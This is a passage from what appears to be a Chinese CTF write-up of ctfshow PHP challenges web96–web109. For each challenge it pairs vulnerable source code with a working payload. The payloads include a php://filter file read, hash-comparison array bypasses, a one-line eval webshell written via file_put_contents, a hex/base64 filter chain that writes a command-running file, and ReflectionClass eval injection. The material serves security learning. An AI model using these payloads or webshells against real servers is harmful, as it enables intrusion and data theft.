class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?u=php://filter/resource=flag.php</code></p><ul><li>highlight_file()：打印输出或者返回文件中语法高亮版本的代码</li><li>利用伪协议读取文件内容</li></ul><h2 id="web97-md5"><a href="#web97-md5" class="headerlink" title="web97(md5)"></a>web97(md5)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: a[]=1&amp;b[]=1</code></p><ul><li>md5强比较，数组绕过</li><li>原理：md5()参数为数组时，不会报错，返回值为null</li></ul><h2 id="web98-amp"><a href="#web98-amp" class="headerlink" title="web98(=&amp;)"></a>web98(=&amp;)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;flag is here&quot;</span>;</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><code>payload: HTTP_FLAG=flag</code></p><ul><li>=&amp;：值或对象都将指向相同的数据    引用</li><li>get和post都指向相同的数据，而get又与cookie和server指向相同的数据，但题要求用get传参，所以使用post传参来替代get传参</li></ul><h2 id="web99-file-put-contents"><a href="#web99-file-put-contents" class="headerlink" title="web99(file_put_contents)"></a>web99(file_put_contents)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?n=1.php    content=&lt;?php eval($_POST[&#39;x&#39;]);?&gt;    蚁剑连接</code></p><ul><li>array_push()：将一个或者多个数据存入数组中</li><li>in_array()：检查数组中是否存在某个值 </li><li>file_put_contents()：将数据写入文件中</li></ul><blockquote><p>当in_array()检查的数据为数字加字符串时，会截取第一个非数字字符前的所有数字作为检查的对象，所以可以传1.php，在该函数中表现的是检测1是否存在，这样就绕过了该函数</p><p>写入文件的内容是什么呢？<br>目的是为了获得路径，读取目录，进而得到flag<br>所以可以写入一句话木马，用蚁剑连接，获得flag</p></blockquote><h2 id="web100-ReflectionClass"><a href="#web100-ReflectionClass" class="headerlink" title="web100(ReflectionClass)"></a>web100(ReflectionClass)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p><ul><li>根据提示，得出flag在ctfshow()类中</li><li>在外层if判断只需让v0为真即可，v0为真，只需让<code>is_numeric($v1)</code>为真即可</li><li>第二层if判断中，不能有<code>;</code>，第三层if中必须有<code>;</code></li><li>根据php特性中的反射类相关知识，构造一个反射类，将ctfshow()相关信息，用echo打印出来即可</li></ul><h2 id="web101-ReflectionClass"><a href="#web101-ReflectionClass" class="headerlink" title="web101(ReflectionClass)"></a>web101(ReflectionClass)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p><ul><li>正则过滤了一大堆东西，实际上payload跟上个题一样</li></ul><h2 id="web102-call-user-func"><a href="#web102-call-user-func" class="headerlink" title="web102(call_user_func)"></a>web102(call_user_func)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php    v1=hex2bin</code></p><ul><li><p>is_numeric()：检测变量是否为数字或数字字符串（可以利用科学计数法绕过）</p></li><li><p>call_user_func()：把第一个参数作为回调函数调用（其余参数为回调函数的参数）</p></li><li><p>解题思路：</p><ul><li>v4需为真，则v2需为数字或者为科学计数法形式的数字字符串</li><li>根据第六行得出，对v2需要进行特殊处理——从第二个字符开始算起</li><li>对经过处理的v2进行某种函数操作，v1需为函数名</li><li>将处理后的数据写入文件中，v3需为文件名</li></ul></li><li><p>call_user_func()函数可与hex2bin()函数搭配使用（hex2bin()：将十六进制文本转换为ASCII码字符）</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * v2为写入文件的内容要求：该数据的base64编码后的数据的十六进制是纯数字或者科学计数法形式</span></span><br><span class="line"><span class="comment"> * 例：&lt;?=`cat *`;</span></span><br><span class="line"><span class="comment"> * base64编码为：PD89YGNhdCAqYDs</span></span><br><span class="line"><span class="comment"> * 十六进制转换为：5044383959474e6864434171594473</span></span><br><span class="line"><span class="comment"> * 因为substr使得数据从第二位开始截取，所以需在前面加两位数字</span></span><br><span class="line"><span class="comment"> * v2=115044383959474e6864434171594473</span></span><br><span class="line"><span class="comment"> * 因为要对v2进行十六进制转换base64，所以v1为hex2bin函数</span></span><br><span class="line"><span class="comment"> * 数据最后后为base64编码形式</span></span><br><span class="line"><span class="comment"> * 所以需利用伪协议写入文件，条件是base64编码</span></span><br><span class="line"><span class="comment"> * v3=php://filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="web103-call-user-func"><a href="#web103-call-user-func" class="headerlink" title="web103(call_user_func)"></a>web103(call_user_func)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php    v1=hex2bin</code></p><ul><li>if表达式中不能出现php，但是我们经过处理的数据也不存在php</li><li>所payload跟上道题一样</li></ul><h2 id="web104-sha1"><a href="#web104-sha1" class="headerlink" title="web104(sha1)"></a>web104(sha1)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v2[]=1    v1[]=1</code></p><ul><li>数组绕过</li></ul><h2 id="web105-foreach"><a href="#web105-foreach" class="headerlink" title="web105(foreach)"></a>web105(foreach)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure><p><code>payload: ?fff=flag error=fff</code></p><ul><li><p> 遍历数组，使用foreach，必须使用数组</p></li><li><p> 代码分析：</p></li></ul><blockquote><p>看源码，能输出数据的只有<code>$flag $error $suces</code>三个变量</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第一个foreach将我们传入的<code>变量=值</code>以键值对的形式进行赋值<br><code>$key=变量 $value=值</code><br>经过第五行的变量覆盖处理得到覆盖后的数据<br><code>$$key=$变量 $$value=$值</code><br>并且$key不等于error</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第二个foreach将我们传入的<code>变量=值</code>以键值对的形式进行赋值<br><code>$key=变量 $value=值</code><br>经过第五行的变量覆盖处理得到覆盖后的数据<br><code>$$key=$变量 $$value=$值</code><br>并且$value不等于flag</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第三段if判断<br>POST传入的值不为变量flag，则输出变量error</p></blockquote><ul><li>解题思路：<ul><li>可以利用error进行输出，只需要POST传入的值不为flag变量即可</li><li>GET传参：?fff=flag  <ul><li>$key=$fff  $value=$flag =&gt; $fff=$flag</li></ul></li><li>POST传参：?error=fff<ul><li>$key=$error $value=$fff =&gt; $error=$fff</li></ul></li><li>将$flag的值赋值给$error，输出$error即可</li><li>满足if判断，即可输出flag</li></ul></li></ul><h2 id="web106-sha1"><a href="#web106-sha1" class="headerlink" title="web106(sha1)"></a>web106(sha1)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v2[]=1 v1[]=2</code></p><ul><li>数组绕过，只需要让值不同即可</li></ul><h2 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107(parse_str)"></a>web107(parse_str)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v3[]=1 v1=&#39;flag=0&#39;</code></p><ul><li>parse_str()：将第一个参数作为数组元素存入第二个变量中</li><li>存数组的变量为$v2，且if中判断索引值为flag的值是否和v3经过md5加密的数据相等</li><li>所以POST传入<code>&#39;flag=0&#39;</code>（注意：POST传参需要用单引号）</li><li>GET可以传入数组进行绕过</li></ul><h2 id="web108-strrev"><a href="#web108-strrev" class="headerlink" title="web108(strrev)"></a>web108(strrev)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>paylad: ?c=a%00778</code></p><ul><li>strrev()：字符串反转，但%00不会反转（%00是一个整体，不会反转成00% ）</li><li>第一个if需要GET传入的参数有字母才能绕过</li><li>第二个if将传入的数据反转后为0x36d（877）才能输出flag</li><li>可以利用00截断，在第一个if判断时截断，使得检测出的数据只有字母，在第二个if判断时，检测反转后的数据，将字母截断，使数据只有数字877</li></ul><h2 id="web109-ReflectionClass-system"><a href="#web109-ReflectionClass-system" class="headerlink" title="web109(ReflectionClass(system()))"></a>web109(ReflectionClass(system()))</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span 